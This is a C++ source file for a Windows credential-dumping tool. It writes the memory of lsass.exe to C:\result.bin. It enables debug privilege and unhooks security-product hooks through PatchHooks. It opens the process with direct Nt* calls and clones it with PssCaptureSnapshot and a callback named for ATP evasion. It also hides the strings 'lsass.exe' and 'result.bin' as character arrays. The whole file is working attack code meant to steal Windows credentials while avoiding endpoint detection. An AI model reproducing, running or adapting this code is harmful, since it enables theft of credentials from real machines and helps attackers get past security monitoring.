#include <windows.h>
#include <DbgHelp.h>
#include <iostream>
#include <TlHelp32.h>
#include "PEstruct.h"
#include "helper.h"
#include "hooks.h"

#include<processsnapshot.h>

#pragma comment(lib, "Rpcrt4.lib")
#pragma comment (lib, "Dbghelp.lib")



BOOL CALLBACK ATPMiniDumpWriteDumpCallback(
	__in     PVOID CallbackParam,
	__in     const PMINIDUMP_CALLBACK_INPUT CallbackInput,
	__inout  PMINIDUMP_CALLBACK_OUTPUT CallbackOutput
)
{
	switch (CallbackInput->CallbackType)
	{
	case 16: // IsProcessSnapshotCallback
		CallbackOutput->Status = S_FALSE;
		break;
	}
	return TRUE;
}





using namespace std;

char strDMP[] = { 'r','e','s','u','l','t','.','b','i','n','\0' };
char strEXE[] = { 'l','s','a','s','s','.','e','x','e','\0' };

int main() {

	DWORD rc;
	DWORD lsassPID = 0;
	HANDLE lsassHandle = NULL;
	HANDLE outFile = NULL;
	HMODULE dbgDLL = NULL;
	BOOL isDumped = FALSE;


	if (!SetDebugPrivilege()) {
		wcout << "PRIV WRONG!" << endl;
	}

	PatchHooks();

	HMODULE ntdll = getNTDLL();


	extern _RtlInitUnicodeString RtlInitUnicodeString;
	extern myNtCreateFile ntCreateFile;
	extern myNtOpenProcess pOpenProcess;

	WCHAR chDmpFile[MAX_PATH] = L"\\??\\C:\\";
	wcscat_s(chDmpFile, sizeof(chDmpFile) / sizeof(wchar_t), charToLPCWSTR(strDMP));
	UNICODE_STRING uFileName;
	RtlInitUnicodeString(&uFileName, chDmpFile);
	OBJECT_ATTRIBUTES FileObjectAttributes;
	IO_STATUS_BLOCK IoStatusBlock;
	ZeroMemory(&IoStatusBlock, sizeof(IoStatusBlock));
	InitializeObjectAttributes(&FileObjectAttributes, &uFileName, OBJ_CASE_INSENSITIVE, NULL, NULL);

	ntCreateFile(&outFile, FILE_GENERIC_WRITE, &FileObjectAttributes, &IoStatusBlock, 0, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_WRITE, FILE_OVERWRITE_IF, FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);



	// Find lsass PID	
	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	PROCESSENTRY32 processEntry = {};
	processEntry.dwSize = sizeof(PROCESSENTRY32);
	LPCWSTR processName = L"";

	if (Process32First(snapshot, &processEntry)) {
		while (_wcsicmp(processName, charToLPCWSTR(strEXE)) != 0) {
			Process32Next(snapshot, &processEntry);
			processName = processEntry.szExeFile;
			lsassPID = processEntry.th32ProcessID;
		}
		wcout << "[+] Got PID: " << lsassPID << endl;
	}

	OBJECT_ATTRIBUTES oa;
	oa = { sizeof(oa) };
	CLIENT_ID clientId = { (HANDLE)lsassPID, NULL };;


	pOpenProcess(&lsassHandle, PROCESS_ALL_ACCESS, &oa, &clientId);


		PSS_CAPTURE_FLAGS snapshotFlags = PSS_CAPTURE_VA_CLONE
		| PSS_CAPTURE_HANDLES
		| PSS_CAPTURE_HANDLE_NAME_INFORMATION
		| PSS_CAPTURE_HANDLE_BASIC_INFORMATION
		| PSS_CAPTURE_HANDLE_TYPE_SPECIFIC_INFORMATION
		| PSS_CAPTURE_HANDLE_TRACE
		| PSS_CAPTURE_THREADS
		| PSS_CAPTURE_THREAD_CONTEXT
		| PSS_CAPTURE_THREAD_CONTEXT_EXTENDED
		| PSS_CREATE_BREAKAWAY
		| PSS_CREATE_BREAKAWAY_OPTIONAL
		| PSS_CREATE_USE_VM_ALLOCATIONS
		| PSS_CREATE_RELEASE_SECTION;

	HPSS snapshotHandle = NULL;

	rc = PssCaptureSnapshot(lsassHandle, snapshotFlags, CONTEXT_ALL, &snapshotHandle);
	if (rc != ERROR_SUCCESS) {
		wprintf(L"PssCaptureSnapshot failed: Win32 error %u.\ntry normal dump", rc);
		isDumped = MiniDumpWriteDump(lsassHandle, lsassPID, outFile, MiniDumpWithFullMemory, NULL, NULL, NULL);

	}
	else {
		MINIDUMP_CALLBACK_INFORMATION callbackInfo;
		SecureZeroMemory(&callbackInfo, sizeof(MINIDUMP_CALLBACK_INFORMATION));
		callbackInfo.CallbackRoutine = ATPMiniDumpWriteDumpCallback;
		callbackInfo.CallbackParam = NULL;


		 isDumped = MiniDumpWriteDump(snapshotHandle, NULL, outFile, MiniDumpWithFullMemory, NULL, NULL, &callbackInfo);
		 PssFreeSnapshot(GetCurrentProcess(), snapshotHandle);

	}




	if (isDumped) {
		cout << "[+] Fin!" << endl;
	}
	return 0;

 


}












